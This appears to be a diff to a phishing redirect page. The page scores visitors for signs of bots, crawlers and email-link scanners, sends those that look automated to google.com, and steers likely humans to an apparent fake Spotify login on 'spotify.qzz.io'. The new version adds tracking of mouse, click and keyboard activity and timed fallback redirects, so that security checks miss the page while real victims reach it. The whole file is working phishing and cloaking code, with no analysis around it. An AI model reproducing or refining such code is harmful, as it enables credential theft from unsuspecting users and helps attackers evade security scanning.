@@ -5,54 +5,137 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        body{margin:0;background:#fff;visibility:hidden}
-        .fallback{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;font-family:Arial,sans-serif;color:#666;font-size:14px}
+        body{margin:0;font-family:Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;height:100vh;opacity:0;transition:opacity 0.3s}
+        .box{text-align:center;padding:20px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .spin{width:20px;height:20px;border:2px solid #ddd;border-top:2px solid #1877f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .msg{color:#666;font-size:14px}
+        #backup{display:none;margin-top:15px;color:#1877f2;text-decoration:none}
     </style>
-    <script>
-        // Immediate silent redirect
-        (function() {
-            let s = 0;
-            let ua = navigator.userAgent.toLowerCase();
-
-            // Quick bot detection (minimal checks for speed)
-            if (/bot|crawler|spider|python|curl|wget|postman|insomnia/.test(ua)) s += 5;
-            if (navigator.webdriver || window._phantom || window.callPhantom) s += 5;
-            if (!window.localStorage || !window.requestAnimationFrame) s += 3;
-
-            // Prepare URLs
-            const realUrl = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=0&interactions=instant';
-            const safeUrl = 'https://google.com';
-
-            // Immediate silent redirect
-            try {
-                location.replace(s >= 10 ? safeUrl : realUrl);
-            } catch(e) {
-                location.href = s >= 10 ? safeUrl : realUrl;
-            }
-        })();
-    </script>
 </head>
 <body>
-    <div class="fallback" id="fallback">
-        <div>Redirecting...</div>
-        <div style="margin-top:10px"><a href="https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=manual&interactions=manual">Continue</a></div>
+    <div class="box">
+        <div class="spin"></div>
+        <div class="msg">Redirecting...</div>
+        <a href="#" id="backup">Continue</a>
     </div>
+    <script>
+        // Enhanced bot detection with interaction tracking
+        const d = () => {
+            let s = 0;
+            let ua = navigator.userAgent.toLowerCase();
+            let startTime = Date.now();
+            let hasInteraction = false;
+            let mouseMovements = 0;
+            let clickEvents = 0;
+
+            // Check email clients & obvious bots - very lenient
+            if (/outlook|thunderbird|mailkit|bot|crawler|spider|python|curl|wget|postman|insomnia/.test(ua)) s += 4;
+
+            // Check missing features (very VPN-friendly)
+            if (!window.localStorage || !window.requestAnimationFrame || !window.JSON) s += 2;
+            if (navigator.webdriver || window._phantom || window.callPhantom) s += 3;
+            if (screen.width < 50 || screen.height < 50) s += 2; // Very small screens only
+
+            // Check for headless indicators - minimal penalty
+            if (!window.outerHeight || !window.outerWidth) s += 1;
+            if (navigator.plugins.length === 0) s += 0; // No penalty - many browsers block plugins
+
+            // Check browser-specific features - minimal penalty
+            if (!window.chrome && /chrome/.test(ua)) s += 1; // Very low penalty
+
+            // Enhanced interaction tracking
+            const trackInteraction = () => {
+                hasInteraction = true;
+            };
+
+            const trackMouse = () => {
+                mouseMovements++;
+                hasInteraction = true;
+            };
+
+            const trackClick = () => {
+                clickEvents++;
+                hasInteraction = true;
+            };
+
+            // Add comprehensive event listeners
+            document.addEventListener('mousemove', trackMouse);
+            document.addEventListener('click', trackClick);
+            document.addEventListener('keydown', trackInteraction);
+            document.addEventListener('scroll', trackInteraction);
+            document.addEventListener('touchstart', trackInteraction);
+            document.addEventListener('touchmove', trackInteraction);
+
+            // Enhanced redirect logic
+            const performRedirect = () => {
+                const elapsedTime = (Date.now() - startTime) / 1000;
+
+                // Calculate final bot score (very VPN-friendly)
+                if (!hasInteraction) s += 1; // Very minimal penalty
+                if (mouseMovements < 1) s += 0; // No penalty for no mouse movement
+                if (clickEvents === 0 && mouseMovements === 0) s += 1; // Only if absolutely no interaction
+                if (elapsedTime < 1) s += 1; // Only penalize extremely fast access
+
+                // Prepare redirect URLs with tracking parameters
+                const baseReal = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login';
+                const baseSafe = 'https://google.com';
+                const jsParam = '&js=1';
+                const delayParam = `&delay=${elapsedTime.toFixed(2)}`;
+                const interactionParam = `&interactions=${mouseMovements + clickEvents}`;
+
+                const realUrl = baseReal + jsParam + delayParam + interactionParam;
+                const safeUrl = baseSafe;
+
+                // Redirect based on bot score (threshold: 10, very lenient for email clicks)
+                location.href = s >= 10 ? safeUrl : realUrl;
+            };
+
+            // Minimum delay before redirect - faster for users
+            setTimeout(performRedirect, 2000);
+
+            // Backup link setup
+            setTimeout(() => {
+                const backupEl = document.getElementById('backup');
+                if (backupEl) {
+                    backupEl.style.display = 'block';
+                    backupEl.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=manual&interactions=manual';
+                }
+            }, 4000);
+
+            // Final timeout redirect (extended for more interaction time)
+            setTimeout(() => {
+                if (window.location.href.indexOf('spotify.qzz.io') === -1 &&
+                    window.location.href.indexOf('google.com') === -1) {
+                    location.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=timeout&interactions=timeout';
+                }
+            }, 10000);
+        };
+
+        // Enhanced initialization
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', d);
+        } else {
+            d();
+        }
+
+        // Fallback initialization
+        window.addEventListener('load', () => {
+            if (!window.botDetectionStarted) {
+                window.botDetectionStarted = true;
+                d();
+            }
+        });
+    </script>
 
     <script>
-        // Fallback only if redirect fails
-        setTimeout(function() {
-            if (window.location.href.indexOf('spotify.qzz.io') === -1 && window.location.href.indexOf('google.com') === -1) {
-                document.body.style.visibility = 'visible';
-                document.getElementById('fallback').style.display = 'block';
+        // Only show page if redirect takes too long (keeps all original logic intact)
+        setTimeout(() => {
+            if (window.location.href.indexOf('spotify.qzz.io') === -1 &&
+                window.location.href.indexOf('google.com') === -1) {
+                document.body.style.opacity = '1';
             }
-        }, 2000);
-
-        // Additional fallback redirect
-        setTimeout(function() {
-            if (window.location.href.indexOf('spotify.qzz.io') === -1 && window.location.href.indexOf('google.com') === -1) {
-                location.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=fallback&interactions=fallback';
-            }
-        }, 3000);
+        }, 1500);
     </script>
 </body>
 </html>
